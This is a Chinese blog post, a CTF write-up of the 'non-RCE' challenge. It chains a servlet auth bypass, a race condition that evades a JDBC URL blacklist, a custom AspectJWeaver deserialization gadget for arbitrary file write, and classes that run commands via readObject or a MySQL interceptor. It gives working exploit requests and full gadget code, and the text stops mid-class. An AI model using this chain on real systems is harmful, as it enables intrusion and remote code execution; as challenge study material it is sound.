<!DOCTYPE html>
<html lang="zh">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <!-- <link rel="stylesheet" href="//unpkg.com/heti/umd/heti.min.css" /> -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@500&family=Roboto+Serif:opsz,wght@8..144,100&display=swap" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        梅子酒の笔记本
    </title>
    <link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/style.css">
<link rel="alternate" href="/atom.xml" title="梅子酒の笔记本" type="application/atom+xml">
</head>

<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            Servlet中的时间竞争及AspectJWeaver反序列化Gadget构造[non-RCE 题解]
        </p>
        <hr>
    </div>
    <div class="post-content heti">
        <h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
<p>今年的D3CTF和蚂蚁一起合作举办，也就是现在的<code>AntCTFxD^3CTF</code>，算起来也算是从HCTF、D3CTF以及<code>AntCTFxD^3CTF</code>这个过程都完整参与了一遍。比赛于上周末结束。其中non-RCE这个题目来自于我之前所在的非攻实验室，出题人是orich和幻猫，题目质量还是不错的，因此写了这篇分析。</p>
<p>这个题目主要涉及到的点有三个，分别为：</p>
<ol>
<li>鉴权绕过</li>
<li>Servlet时间竞争绕过黑名单</li>
<li>AspectJWeaver反序列化Gadget构造</li>
</ol>
<p>这一篇文章就主要针对这三个点进行分析。</p>
<h2 id="鉴权绕过"><a class="markdownIt-Anchor" href="#鉴权绕过"></a> 鉴权绕过</h2>
<p>在这个题目中设计了几个Filter，这里只说下涉及到的两个：</p>
<ol>
<li>AntiUrlAttackFilter</li>
<li>LoginFilter</li>
</ol>
<p>当我们需要访问<code>/admin/*</code>格式的地址时，会触发LoginFilter要求我们密码，然而密码无从知晓。</p>
<p>而AntiUrlAttackFilter这个过滤器对所有url生效，并且里面进行了对url的处理：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class="line">    HttpServletResponse res = (HttpServletResponse) servletResponse;</span><br><span class="line">    String url = req.getRequestURI();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (...) &#123;</span><br><span class="line">       ...</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.contains(<span class="string">";"</span>)) &#123;</span><br><span class="line">        String filteredUrl = url.replaceAll(<span class="string">";"</span>, <span class="string">""</span>);</span><br><span class="line">        req.getRequestDispatcher(filteredUrl).forward(servletRequest, servletResponse);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此对于<code>/;admin/importData</code>格式的请求，AntiUrlAttackFilter会对其处理变为<code>/admin/importData</code>并重新进行路由，鉴权也就被绕过了。</p>
<h2 id="servlet时间竞争"><a class="markdownIt-Anchor" href="#servlet时间竞争"></a> Servlet时间竞争</h2>
<p>在该题目中，攻击的入手点在于AdminServlet下的<code>doGet()</code>，我们需要传入一个jdbc url，服务端会对该jdbc url使用com.mysql.jdbc.Driver发起连接。同时，会对该jdbc url进行黑名单检查，当其中出现<code>%</code>或<code>autoDeserialize</code>时则会进行拦截：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 从GET参数取值</span></span><br><span class="line">    String databaseType = req.getParameter(<span class="string">"databaseType"</span>);</span><br><span class="line">    String jdbcUrl = req.getParameter(<span class="string">"jdbcUrl"</span>);</span><br><span class="line">    <span class="comment">// 黑名单检查</span></span><br><span class="line">    <span class="keyword">if</span> (!BlackListChecker.check(jdbcUrl)) &#123;</span><br><span class="line">        System.out.println(<span class="string">"detect attacking!"</span>);</span><br><span class="line">        resp.sendError(HttpServletResponse.SC_BAD_REQUEST, <span class="string">"The jdbc url contains illegal character!"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">        <span class="comment">// 链接jdbc url</span></span><br><span class="line">        DriverManager.setLoginTimeout(<span class="number">5</span>);</span><br><span class="line">        Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>);</span><br><span class="line">        DriverManager.getConnection(jdbcUrl);</span><br><span class="line">        outputResponse(resp, <span class="string">"ok"</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在BlackHat2019上有一个关于Mysql反序列化攻击的议题，这种攻击方式需要通过jdbc url设置<code>autoDeserialize=true</code>以及对应的interceptor用于触发反序列化，具体细节不做阐述。</p>
<p>接着便会遇到一个矛盾：</p>
<ol>
<li>需要通过设置<code>autoDeserialize=true</code>来开启反序列化</li>
<li>黑名单不允许<code>autoDeserialize</code>的出现</li>
</ol>
<p>此时便可以借助Servlet的时间竞争缺陷进行绕过。</p>
<p>Servlet的生命周期交给容器进行管理，容器在加载Servlet时进行实例化，常见的Tomcat、Jboss、WebLogic这些都是Web容器，而在这个题目中则使用的是Tomcat。Servlet的生命周期通过<code>javax.servlet.Servlet</code>接口中的<code>init()</code>、<code>service()</code>、<code>destory()</code>进行表示。</p>
<p>当Servlet初始化完成后，便能对相应的请求进行处理。当一个Servlet收到对应的请求时，会调用<code>service()</code>方法，并将对应的方法和请求参数传递至对应的方法。比如<code>doGet()</code>、<code>doPost()</code>。此时需要注意的是，JSP/Servlet容器默认使用单实例多线程的方式处理多个请求，即在客户端第一次请求Servlet时，实例化只会进行一次，当第二个用户请求该Servlet时，则会继续使用这个已实例化的Servlet。</p>
<p>因此尽管每次执行都会发生在不同的线程，但是容器中只有一个Servlet实例，如果Servlet实例内部的某个实例属性的内容会被多个线程访问并修改，就有可能导致时间竞争问题。</p>
<p>再来看变量<code>jdbcUrl</code>，我们可以发现它并不是实例变量又或是静态变量，那么是不是意味着并不存在时间竞争的问题呢。<code>jdbcUrl</code>会传入<code>BlackListChecker.check()</code>，而在这个函数中会通过<code>BlackListChecker.setToBeChecked()</code>将<code>jdbcUrl</code>变量的值赋予至实例变量<code>this.toBeChecked</code>。</p>
<p>因此需要思考的就是，作为Servlet内调用的类，<code>BlackListChecker</code>是否也会面临时间竞争的问题。答案是肯定的。</p>
<p>由于<code>BlackListChecker</code>也拥有实例变量并进行了赋值，并且实际进行了实例化，此时它的实例变量会与<code>AdminServlet</code>的实例变量一起分配至Java堆上，这同样是所有线程共享的。因此当只有一个实例时，不仅是<code>AdminServlet</code>的实例变量会遇到时间竞争的问题，<code>BlackListChecker</code>也同样遇到了这个问题。</p>
<p>此时就需要对<code>jdbcUrl</code>进行时间竞争，使用两个不同的值，一个是不触发黑名单的，一个是触发黑名单的:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /;admin/importData?jdbcUrl=jdbc%3amysql%3a%2f%2f0.0.0.0%3a3306%2fmysql%3fcharacterEncoding%3dutf8%26useUnicode%3dtrue%26useSSL%3dfalse&amp;databaseType=mysql&amp;a=§1§ HTTP/1.1</span><br><span class="line"></span><br><span class="line">GET /;admin/importData?jdbcUrl=jdbc%3amysql%3a%2f%2f0.0.0.0%3a3306%2fmysql%3fcharacterEncoding%3dutf8%26useUnicode%3dtrue%26useSSL%3dfalse%26statementInterceptors%3dcom.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26autoDeserialize%3dtrue%26user%3dyso_Jdk7u21_touch%20/tmp/aaa&amp;databaseType=mysql&amp;a=§1§ HTTP/1.1</span><br></pre></td></tr></table></figure>
<h2 id="aspectjweaver反序列化gadget构造"><a class="markdownIt-Anchor" href="#aspectjweaver反序列化gadget构造"></a> AspectJWeaver反序列化Gadget构造</h2>
<p>在二月份的时候，ysoserialize更新了一条新的反序列化Gadget：<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/AspectJWeaver.java" target="_blank" rel="noopener">AspectJWeaver</a>，从代码里可以看到其构造方式。</p>
<p>在ysoserial中，AspectJWeaver的反序列化Gadget构造中部分是依赖于CommonsCollections的，但是在这个环境中并没有CommonsCollections的依赖，因此需要修改其构造过程。题目提供了一个名为DataMap的类，这个类可以提供构造Gadget的功能，接下来就需要理解ysoserial的构造过程并修改。</p>
<p>AspectJWeaver在ysoserialize的主要调用链如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">    HashMap.put()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            TiedMapEntry.hashCode()</span><br><span class="line">                TiedMapEntry.getValue()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        SimpleCache$StorableCachingMap.put()</span><br><span class="line">                            SimpleCache$StorableCachingMap.writeToPath()</span><br><span class="line">                                FileOutputStream.write()</span><br></pre></td></tr></table></figure>
<p>我们可以发现从<code>HashMap.hash()</code>之后到<code>SimpleCache$StorableCachingMap.put()</code>之前都是根据CommonsCollections进行构建的，因此需要修改的就是这一部分。从<code>HashMap.hash()</code>的调用开始，下一级调用为<code>hashCode()</code>的调用有<code>DataMap$Entry.hashCode()</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> DataMap.hash(<span class="keyword">this</span>.getKey()) ^ DataMap.hash(<span class="keyword">this</span>.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着调用<code>this.getValue()</code>，这一层调用会进到<code>DataMap.get()</code>，其中主要有<code>this.values.get()</code>、<code>this.wrapperMap.get()</code>、和<code>this.values.put()</code>，但是<code>get()</code>无法找到符合条件的函数实现，因此再看<code>put()</code>，<code>put()</code>的传参为:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.values.put(key, v);</span><br></pre></td></tr></table></figure>
<p>其中<code>key</code>来自于<code>DataMap.get(Object key)</code>，v来自于<code>v = this.wrapperMap.get(key);</code>，所以可以将<code>this.wrapperMap</code>构造为一个HashMap用于存储文件内容和文件名，而<code>this.values</code>则为<code>SimpleCache$StorableCachingMap</code>，因此可以构造出这一部分：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Constructor aspectjConstructor = Reflections.getFirstCtor(<span class="string">"org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap"</span>);</span><br><span class="line">Reflections.setAccessible(aspectjConstructor);</span><br><span class="line">Object simpleCache = aspectjConstructor.newInstance(<span class="string">"."</span>,<span class="number">12</span>);</span><br><span class="line">HashMap wrapperMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">wrapperMap.put(filename,content);</span><br><span class="line">DataMap dataMap = <span class="keyword">new</span> DataMap(wrapperMap,(Map)simpleCache);</span><br></pre></td></tr></table></figure>
<p>此时整个调用链便已经完整了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">    HashMap.put()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            DataMap$Entry.hashcode</span><br><span class="line">                DataMap$Entry.getValue()</span><br><span class="line">                    DataMap.get()</span><br><span class="line">                        SimpleCache$StorableCachingMap.put()</span><br><span class="line">                            SimpleCache$StorableCachingMap.writeToPath()</span><br><span class="line">                                FileOutputStream.write()</span><br></pre></td></tr></table></figure>
<p>接着构造<code>DataMap$Entry</code>，主要是对内部类的实例化时指明Outer Class以及<code>this.key</code>为文件名。剩余部分则直接照搬ysoserial的部分即可。</p>
<p>完整的构造如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> clojure.lang.Cons;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> checker.DataMap;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">HashSet.readObject()</span></span><br><span class="line"><span class="comment">    HashMap.put()</span></span><br><span class="line"><span class="comment">        HashMap.hash()</span></span><br><span class="line"><span class="comment">            DataMap$Entry.hashcode</span></span><br><span class="line"><span class="comment">                DataMap$Entry.getValue()</span></span><br><span class="line"><span class="comment">                    DataMap.get()</span></span><br><span class="line"><span class="comment">                        SimpleCache$StorableCachingMap.put()</span></span><br><span class="line"><span class="comment">                            SimpleCache$StorableCachingMap.writeToPath()</span></span><br><span class="line"><span class="comment">                                FileOutputStream.write()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@PayloadTest</span>(skip=<span class="string">"non RCE"</span>)</span><br><span class="line"><span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>, <span class="string">"unchecked"</span>&#125;)</span><br><span class="line"><span class="meta">@Dependencies</span>(&#123;<span class="string">"org.aspectj:aspectjweaver:1.9.2"</span>&#125;)</span><br><span class="line"><span class="meta">@Authors</span>(&#123;Authors.MEIZJ&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AspectJWeaverSingle</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Serializable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Serializable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sep = command.lastIndexOf(<span class="string">';'</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Command format is: &lt;filename&gt;:&lt;base64 Object&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String[] parts = command.split(<span class="string">";"</span>);</span><br><span class="line">        String filename = parts[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">byte</span>[] content = Base64.decodeBase64(parts[<span class="number">1</span>]);</span><br><span class="line">        Constructor aspectjConstructor = Reflections.getFirstCtor(<span class="string">"org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap"</span>);</span><br><span class="line">        Reflections.setAccessible(aspectjConstructor);</span><br><span class="line">        Object simpleCache = aspectjConstructor.newInstance(<span class="string">"."</span>,<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        HashMap wrapperMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        wrapperMap.put(filename,content);</span><br><span class="line">        DataMap dataMap = <span class="keyword">new</span> DataMap(wrapperMap,(Map)simpleCache);</span><br><span class="line"></span><br><span class="line">        Constructor dataMapEntryConstructor = Reflections.getFirstCtor(<span class="string">"checker.DataMap$Entry"</span>);</span><br><span class="line">        Reflections.setAccessible(dataMapEntryConstructor);</span><br><span class="line">        Object dataMapEntry = dataMapEntryConstructor.newInstance(dataMap,filename);</span><br><span class="line"></span><br><span class="line">        HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        map.add(<span class="string">"foo"</span>);</span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">"map"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">"backingMap"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f);</span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">"elementData"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f2);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Reflections.setAccessible(keyField);</span><br><span class="line">        keyField.set(node, dataMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        args = <span class="keyword">new</span> String[]&#123;<span class="string">"ahi.txt;YWhpaGloaQ=="</span>&#125;;</span><br><span class="line">        PayloadRunner.run(AspectJWeaver.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行"></a> 命令执行</h2>
<p>在成功写入文件后，需要进行执行命令。这里有两种方法：</p>
<ol>
<li>反序列化执行命令</li>
<li>interceptor加载 - 来自LFY</li>
</ol>
<p>反序列化执行命令先通过AspectJWeaver向服务器上写入恶意的类，该类中重新实现一个readObject方法，再通过MySQL的反序列化加载该类，执行readObject实现RCE。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先入至服务器</span></span><br><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ant</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String a;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ant</span><span class="params">()</span></span>&#123;</span><br><span class="line">        a = <span class="string">"a"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectInputStream oin)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        oin.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"touch /tmp/ant-ctf"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将MySQL返回的序列化数据替换为ant.obj</span></span><br><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ant</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String a;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ant</span><span class="params">()</span></span>&#123;</span><br><span class="line">        a = <span class="string">"a"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectInputStream oin)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        oin.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"touch /tmp/ant-ctf"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另一种是实现一个继承了interceptor接口的恶意类，再通过interceptor自动执行特定函数这个特点进行RCE。此时指定<code>statementInterceptors=servlet.antInterceptor</code>即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"><span class="keyword">import</span> com.mysql.jdbc.Connection;</span><br><span class="line"><span class="keyword">import</span> com.mysql.jdbc.ResultSetInternalMethods;</span><br><span class="line"><span class="keyword">import</span> com.mysql.jdbc.Statement;</span><br><span class="line"><span class="keyword">import</span> com.mysql.jdbc.StatementInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">antInterceptor</span> <span class="keyword">implements</span>  <span class="title">StatementInterceptor</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span 